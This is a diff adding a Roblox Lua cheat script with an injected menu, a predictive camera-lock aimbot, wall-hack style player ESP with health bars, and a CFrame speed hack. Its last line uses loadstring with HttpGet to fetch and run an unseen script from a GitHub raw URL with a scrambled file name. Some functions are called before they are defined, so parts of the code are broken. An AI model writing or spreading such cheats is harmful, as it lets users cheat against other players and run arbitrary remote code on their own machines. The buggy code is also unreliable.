@@ -1,0 +1,340 @@
+-- Instances and Variables
+local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+local mainFrame = Instance.new("Frame")
+local uiCorner = Instance.new("UICorner")
+local titleLabel = Instance.new("TextLabel")
+local toggleButton = Instance.new("TextButton")
+local espButton = Instance.new("TextButton")
+local cFrameWalkButton = Instance.new("TextButton")
+local notification = Instance.new("TextLabel")
+local predictionTextBox = Instance.new("TextBox")
+local applyButton = Instance.new("TextButton")
+
+-- Rainbow Background
+local tweenService = game:GetService("TweenService")
+local colors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(255, 255, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 255, 255), Color3.fromRGB(0, 0, 255), Color3.fromRGB(255, 0, 255)}
+
+-- GUI Properties
+screenGui.Name = "ToggleButtonGui"
+
+mainFrame.Name = "MainFrame"
+mainFrame.Parent = screenGui
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
+mainFrame.Size = UDim2.new(0, 300, 0, 450)
+mainFrame.Active = true
+mainFrame.Draggable = true
+uiCorner.Parent = mainFrame
+
+titleLabel.Name = "TitleLabel"
+titleLabel.Parent = mainFrame
+titleLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Position = UDim2.new(0.1, 0, 0.02, 0)
+titleLabel.Size = UDim2.new(0, 240, 0, 30)
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.Text = "HAWKTUAHH.LUA"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextScaled = true
+titleLabel.TextSize = 18
+titleLabel.TextWrapped = true
+
+toggleButton.Name = "ToggleButton"
+toggleButton.Parent = mainFrame
+toggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+toggleButton.Position = UDim2.new(0.1, 0, 0.15, 0)
+toggleButton.Size = UDim2.new(0, 240, 0, 50)
+toggleButton.Font = Enum.Font.SourceSans
+toggleButton.Text = "OFF"
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.TextScaled = true
+toggleButton.TextSize = 14 toggleButton.TextWrapped = true
+
+espButton.Name = "ESPButton"
+espButton.Parent = mainFrame
+espButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+espButton.Position = UDim2.new(0.1, 0, 0.35, 0)
+espButton.Size = UDim2.new(0, 240, 0, 50)
+espButton.Font = Enum.Font.SourceSans
+espButton.Text = "ESP OFF"
+espButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+espButton.TextScaled = true
+espButton.TextSize = 14
+espButton.TextWrapped = true
+
+cFrameWalkButton.Name = "CFrameWalkButton"
+cFrameWalkButton.Parent = mainFrame
+cFrameWalkButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+cFrameWalkButton.Position = UDim2.new(0.1, 0, 0.55, 0)
+cFrameWalkButton.Size = UDim2.new(0, 240, 0, 50)
+cFrameWalkButton.Font = Enum.Font.SourceSans
+cFrameWalkButton.Text = "CFrame Walk OFF"
+cFrameWalkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+cFrameWalkButton.TextScaled = true
+cFrameWalkButton.TextSize = 14
+cFrameWalkButton.TextWrapped = true
+
+predictionTextBox.Name = "PredictionTextBox"
+predictionTextBox.Parent = mainFrame
+predictionTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+predictionTextBox.Position = UDim2.new(0.1, 0, 0.75, 0)
+predictionTextBox.Size = UDim2.new(0, 180, 0, 50)
+predictionTextBox.Font = Enum.Font.SourceSans
+predictionTextBox.PlaceholderText = "Set Prediction"
+predictionTextBox.Text = ""
+predictionTextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+predictionTextBox.TextScaled = true
+predictionTextBox.TextSize = 14
+predictionTextBox.TextWrapped = true
+
+applyButton.Name = "ApplyButton"
+applyButton.Parent = mainFrame
+applyButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+applyButton.Position = UDim2.new(0.65, 0, 0.75, 0)
+applyButton.Size = UDim2.new(0, 70, 0, 50)
+applyButton.Font = Enum.Font.SourceSans
+applyButton.Text = "✔"
+applyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+applyButton.TextScaled = true
+applyButton.TextSize = 14
+applyButton.TextWrapped = true
+
+notification.Name = "Notification"
+notification.Parent = mainFrame notification.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+notification.Position = UDim2.new(0.1, 0, 0.85, 0)
+notification.Size = UDim2.new(0, 240, 0, 50)
+notification.Font = Enum.Font.SourceSans
+notification.Text = ""
+notification.TextColor3 = Color3.fromRGB(255, 255, 255)
+notification.TextScaled = true
+notification.TextSize = 14
+notification.TextWrapped = true
+notification.Visible = false
+
+local toggled = false
+local espToggled = false
+local cFrameWalkToggled = false
+local userInputService = game:GetService("UserInputService")
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local localPlayer = game.Players.LocalPlayer
+local currentTarget = nil
+local espEnabled = false
+local cFrameWalkSpeed = 250
+local customPrediction = 0.1475
+
+-- Toggle Function
+toggleButton.MouseButton1Click:Connect(function()
+    toggled = not toggled
+    toggleButton.Text = toggled and "ON" or "OFF"
+    toggleButton.BackgroundColor3 = toggled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+    if not toggled then
+        notification.Visible = false
+        currentTarget = nil
+    end
+end)
+
+-- ESP Toggle Function
+espButton.MouseButton1Click:Connect(function()
+    espToggled = not espToggled
+    espButton.Text = espToggled and "ESP ON" or "ESP OFF"
+    espButton.BackgroundColor3 = espToggled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+    if espToggled then
+        enableESP()
+    else
+        disableESP()
+    end
+end)
+
+-- CFrame Walk Toggle Function
+cFrameWalkButton.MouseButton1Click:Connect(function()
+    cFrameWalkToggled = not cFrameWalkToggled
+    cFrameWalkButton.Text = cFrameWalkToggled and "CFrame Walk ON" or "CFrame Walk OFF"
+    cFrameWalkButton.BackgroundColor3 = cFrameWalkToggled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+    if cFrameWalkToggled then
+        enableCFrameWalk()
+    end
+end)
+
+-- Apply Custom Prediction
+applyButton.MouseButton1Click:Connect(function() local predictionValue = tonumber(predictionTextBox.Text)
+    if predictionValue then
+        customPrediction = predictionValue
+        notification.Text = "Prediction set to " .. tostring(predictionValue)
+        notification.Visible = true
+        wait(2)
+        notification.Visible = false
+    else
+        notification.Text = "Invalid prediction value!"
+        notification.Visible = true
+        wait(2)
+        notification.Visible = false
+    end
+end)
+
+-- ESP Functionality
+local function enableESP()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local highlight = Instance.new("Highlight")
+            highlight.Name = "PlayerESP"
+            highlight.FillColor = Color3.fromRGB(255, 0, 0)
+            highlight.FillTransparency = 0.5
+            highlight.OutlineTransparency = 0
+            highlight.Parent = player.Character
+
+            -- Health bar
+            local billboard = Instance.new("BillboardGui", player.Character.Head)
+            billboard.Name = "HealthBar"
+            billboard.Size = UDim2.new(1, 0, 1, 0)
+            billboard.StudsOffset = Vector3.new(3, 2, 0)
+            billboard.AlwaysOnTop = true
+            local bar = Instance.new("Frame", billboard)
+            bar.BackgroundColor3 = Color3.new(0, 255, 0)
+            bar.BorderSizePixel = 0
+            bar.Size = UDim2.new(1, 0, player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth, 0)
+            player.Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
+                bar.Size = UDim2.new(1, 0, player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth, 0)
+                bar.BackgroundColor3 = Color3.fromRGB(255 - (player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth * 255), player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth * 255, 0)
+            end) end
+    end
+end
+
+local function disableESP()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChild("PlayerESP") then
+            player.Character.PlayerESP:Destroy()
+            if player.Character:FindFirstChild("Head"):FindFirstChild("HealthBar") then
+                player.Character.Head.HealthBar:Destroy()
+            end
+        end
+    end
+end
+
+-- CFrame Walk Functionality
+local function enableCFrameWalk()
+    runService.RenderStepped:Connect(function()
+        if cFrameWalkToggled then
+            for _, keyCode in ipairs({Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D}) do
+                if userInputService:IsKeyDown(keyCode) then
+                    localPlayer.Character.HumanoidRootPart.CFrame = localPlayer.Character.HumanoidRootPart.CFrame + (getVelocity(keyCode) * cFrameWalkSpeed * runService.RenderStepped:Wait())
+                end
+            end
+        end
+    end)
+end
+
+local function getVelocity(keyCode)
+    if keyCode == Enum.KeyCode.W then
+        return Vector3.new(0, 0, -1)
+    elseif keyCode == Enum.KeyCode.A then
+        return Vector3.new(-1, 0, 0)
+    elseif keyCode == Enum.KeyCode.S then
+        return Vector3.new(0, 0, 1)
+    elseif keyCode == Enum.KeyCode.D then
+        return Vector3.new(1, 0, 0)
+    end
+end
+
+-- Applying Rainbow Background
+local function applyRainbow(guiElement)
+    local colorIndex = 1
+    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true)
+    local tween = tweenService:Create(guiElement, tweenInfo, {BackgroundColor3 = colors[colorIndex]})
+
+    tween:Play()
+    tween.Completed:Connect(function()
+        colorIndex = colorIndex % #colors + 1
+        tween = tweenService:Create(guiElement, tweenInfo, {BackgroundColor3 = colors[colorIndex]})
+        tween:Play()
+    end)
+end
+
+applyRainbow(mainFrame)
+
+-- Lock Function
+local function getClosestPlayer() local closestPlayer, shortestDistance = nil, math.huge
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local pos = camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
+            local distance = (Vector2.new(pos.X, pos.Y) - Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)).Magnitude
+
+            if distance < shortestDistance then
+                closestPlayer = player
+                shortestDistance = distance
+            end
+        end
+    end
+    return closestPlayer
+end
+
+local function getPrediction(target)
+    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+    local pingNumber = tonumber(string.match(ping, "%d+"))
+    local prediction = pingNumber / 1000
+    return target.Character.HumanoidRootPart.CFrame + (target.Character.HumanoidRootPart.Velocity * prediction)
+end
+
+runService.RenderStepped:Connect(function()
+    if toggled and not currentTarget then
+        currentTarget = getClosestPlayer()
+        if currentTarget then
+            notification.Text = "CamLock enabled on " .. currentTarget.Name
+            notification.Visible = true
+            wait(2)
+            notification.Visible = false
+        end
+    end
+
+    if toggled and currentTarget and currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") then
+        camera.CFrame = CFrame.new(camera.CFrame.Position, getPrediction(currentTarget).p)
+    end
+end)
+
+-- Load the provided external script
+getgenv().khen = {
+    ['Camlock'] = {
+        ['Manual Prediction'] = 0.1475,
+        ['Auto Prediction'] = {
+            ['Enabled'] = true,
+            ['Ping'] = {
+                ['20'] = 0.10036,
+                ['30'] = 0.1130,
+                ['40'] = 0.13544,
+                ['50'] = 0.1357,
+                ['60'] = 0.13598, ['70'] = 0.13892,
+                ['80'] = 0.1403,
+                ['90'] = 0.1446,
+                ['100'] = 0.1475,
+            },
+        },
+        ['Smoothing'] = {
+            ['Enabled'] = false,
+            ['Value'] = 0.013
+        },
+        ['Offset'] = {
+            ['Jump'] = -1,
+            ['Fall'] = -1,
+        },
+        ['Auto Shoot'] = true,
+        ['Airshot Function'] = {
+            ['Enabled'] = true,
+            ['Part'] = "LowerTorso"
+        },
+        ['Target Part'] = "HumanoidRootPart"
+    },
+    ['HvH'] = {
+        ['Target Strafe'] = {
+            ['Enabled'] = true,
+            ['Speed'] = 70,
+            ['Distance'] = 11,
+            ['Height'] = 8,
+        },
+        ['Cframe Walk'] = {
+            ['Enabled'] = true,
+            ['Amount'] = 2
+        },
+    }
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tuankhen/khen/refs/heads/main/1872jahshiapgmsyZ2X1552n3ZWs0TArj5lKOGaiZSzqe9VJ3Uv1CGjfuNc0g2b6vTb0mGuNy4O.lua.txt", true))()
